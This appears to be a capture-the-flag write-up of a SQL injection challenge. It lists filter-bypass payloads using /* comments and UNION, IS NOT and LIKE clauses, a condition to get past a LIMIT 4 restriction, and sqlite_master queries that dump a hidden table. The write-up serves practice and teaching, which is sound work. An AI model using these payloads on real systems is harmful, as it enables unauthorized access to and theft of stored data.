# Database Reincursion

#### **Vulnerability:** SQL Injection (SQLi)



## 1. Authentication Bypass

**Reconnaissance:**

- **Standard payload**: ` or 1=1-- -` triggered a custom error : **Input rejected by security filter.**
- **Blocked**: The word `or` and `--`.

**Exploitation:**

Sentences triggering filters are ` or ` and ` --` .  

```sql
x' union select null,null,null/*
x' IS NOT '2'/*
x' LIKE '%'/*
```

## 2. Passcode Retrieval

**Reconnaissance:**

- Searching for `Kiwi` returned 4 results (IDs 10, 11, 12, 13) with no passcode in the notes.
- Triggering an error revealed a query constraint: `LIMIT 4`.

**Exploitation:** To bypass the `LIMIT 4` and find hidden entries, the query was modified to filter out the known IDs.

```sql
Kiwi' and id>13/*
Kiwi' and Department='Management'/*
```

## 3. Admin Panel & Flag Extraction

**Reconnaissance:**

- The page allows querying the `reports` table.
- **Metadata Directory** listed a table named `REDACTED`.

**Exploitation:**

1.**Table Discovery:**

```sql
 x' union select sql,2,3,4 from sqlite_master/*
 x' union select * from metadata/*
```

   - Result: Discovered hidden table `CITADEL_ARCHIVE_2077` with column `secrets`.

2.**Flag Retrieval:**

```sql
x' union select *,2,3,4 from CITADEL_ARCHIVE_2077/*
```


